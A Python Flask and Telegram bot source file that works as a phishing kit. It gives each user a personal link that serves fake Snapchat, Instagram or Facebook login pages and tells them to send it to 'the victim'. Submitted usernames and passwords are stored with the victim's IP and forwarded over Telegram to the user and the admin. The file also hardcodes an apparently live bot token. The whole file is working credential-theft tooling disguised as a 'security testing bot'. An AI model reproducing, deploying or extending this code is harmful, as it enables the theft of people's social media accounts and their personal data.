#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sqlite3
import random
import string
import requests
import json
import os
from datetime import datetime
from flask import Flask, request

# =================== الإعدادات ===================
BOT_TOKEN = "8670557092:AAEQdhH5pdVn5b9d2xFYqcytjKE8Ptl9MHo"
ADMIN_ID = "8349226573"

# =================== قاعدة البيانات ===================
conn = sqlite3.connect('data.db', check_same_thread=False)
c = conn.cursor()

c.execute('''CREATE TABLE IF NOT EXISTS users
             (user_id TEXT PRIMARY KEY, username TEXT, name TEXT, code TEXT UNIQUE)''')
c.execute('''CREATE TABLE IF NOT EXISTS logs
             (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, page TEXT, data TEXT, ip TEXT, time TEXT)''')
conn.commit()

# =================== دوال البوت ===================
def send(chat_id, text, kb=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if kb:
        data["reply_markup"] = json.dumps(kb)
    try:
        requests.post(url, data=data, timeout=10)
    except:
        pass

def answer(cb_id, text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                      data={"callback_query_id": cb_id, "text": text}, timeout=10)
    except:
        pass

def gen_code():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def set_webhook(url):
    try:
        result = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={url}")
        return result.json()
    except:
        return None

# =================== صفحات التصيد ===================
PAGES = {
    "snap": """<!DOCTYPE html>
<html><head><title>Snapchat</title></head>
<body style="font-family:Arial;text-align:center;padding:50px">
    <h1>Snapchat</h1>
    <form method=POST>
        <input type=text name=username placeholder="اسم المستخدم" required><br><br>
        <input type=password name=password placeholder="كلمة المرور" required><br><br>
        <button type=submit>تسجيل الدخول</button>
    </form>
</body></html>""",
    "ig": """<!DOCTYPE html>
<html><head><title>Instagram</title></head>
<body style="font-family:Arial;text-align:center;padding:50px">
    <h1>Instagram</h1>
    <form method=POST>
        <input type=text name=username placeholder="اسم المستخدم" required><br><br>
        <input type=password name=password placeholder="كلمة المرور" required><br><br>
        <button type=submit>تسجيل الدخول</button>
    </form>
</body></html>""",
    "fb": """<!DOCTYPE html>
<html><head><title>Facebook</title></head>
<body style="font-family:Arial;text-align:center;padding:50px">
    <h1>Facebook</h1>
    <form method=POST>
        <input type=text name=email placeholder="البريد الإلكتروني" required><br><br>
        <input type=password name=password placeholder="كلمة المرور" required><br><br>
        <button type=submit>تسجيل الدخول</button>
    </form>
</body></html>"""
}

# =================== سيرفر Flask ===================
app = Flask(__name__)
PUBLIC_URL = os.environ.get('PUBLIC_URL', 'https://your-app.onrender.com')

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if not update:
        return {"ok": True}
    
    if 'message' in update:
        msg = update['message']
        chat_id = str(msg['chat']['id'])
        user_id = str(msg['from']['id'])
        username = msg['from'].get('username', '')
        name = msg['from'].get('first_name', '')
        text = msg.get('text', '')
        
        if text == '/setwebhook':
            if user_id == ADMIN_ID:
                result = set_webhook(PUBLIC_URL + '/webhook')
                if result and result.get('ok'):
                    send(chat_id, f"✅ تم تعيين Webhook بنجاح!\n📍 {PUBLIC_URL}/webhook")
                else:
                    send(chat_id, f"❌ فشل تعيين Webhook")
            else:
                send(chat_id, "❌ هذا الأمر للمطور فقط.")
            return {"ok": True}
        
        if text == '/start':
            c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
            if not c.fetchone():
                code = gen_code()
                c.execute("INSERT INTO users (user_id, username, name, code) VALUES (?,?,?,?)",
                          (user_id, username, name, code))
                conn.commit()
                if user_id != ADMIN_ID:
                    send(ADMIN_ID, f"🔔 مستخدم جديد\n👤 {name}\n🆔 {user_id}")
            
            kb = {
                "inline_keyboard": [
                    [{"text": "🎭 سناب شات", "callback_data": "snap"}],
                    [{"text": "🎭 انستقرام", "callback_data": "ig"}],
                    [{"text": "🎭 فيسبوك", "callback_data": "fb"}]
                ]
            }
            send(chat_id, "🤖 بوت الاختبارات الأمنية\n\nاختر نوع الاختراق:", kb)
    
    elif 'callback_query' in update:
        cb = update['callback_query']
        user_id = str(cb['from']['id'])
        data = cb['data']
        
        answer(cb['id'], "جاري تجهيز الرابط...")
        
        c.execute("SELECT code FROM users WHERE user_id=?", (user_id,))
        row = c.fetchone()
        if row and data in PAGES:
            code = row[0]
            link = f"{PUBLIC_URL}/{data}/{code}"
            send(user_id, f"✅ رابط الاختراق الخاص بك\n\n🔗 {link}\n\nأرسله للضحية")
    
    return {"ok": True}

@app.route('/<page>/<code>', methods=['GET', 'POST'])
def index(page, code):
    c.execute("SELECT user_id FROM users WHERE code=?", (code,))
    row = c.fetchone()
    if not row:
        return "رابط غير صالح", 404
    
    user_id = row[0]
    
    if request.method == 'POST':
        data = dict(request.form)
        c.execute("INSERT INTO logs (user_id, page, data, ip, time) VALUES (?, ?, ?, ?, ?)",
                  (user_id, page, json.dumps(data), request.remote_addr, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        
        msg = f"🔐 اختراق جديد!\n━━━━━━━━━━━━━━\n👤 الهدف: {user_id}\n📱 النوع: {page}\n📝 البيانات: {json.dumps(data)}\n🌐 IP: {request.remote_addr}"
        send(ADMIN_ID, msg)
        send(user_id, f"✅ تم اختراق {page} بنجاح!\n\nالبيانات:\n{json.dumps(data, indent=2)}")
        return "<h2 style='text-align:center;margin-top:100px'>✅ تم تسجيل الدخول بنجاح</h2>"
    
    return PAGES.get(page, PAGES['ig'])

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"""
    ✅ البوت يعمل!
    📍 الرابط: {PUBLIC_URL}
    """)
    app.run(host='0.0.0.0', port=port)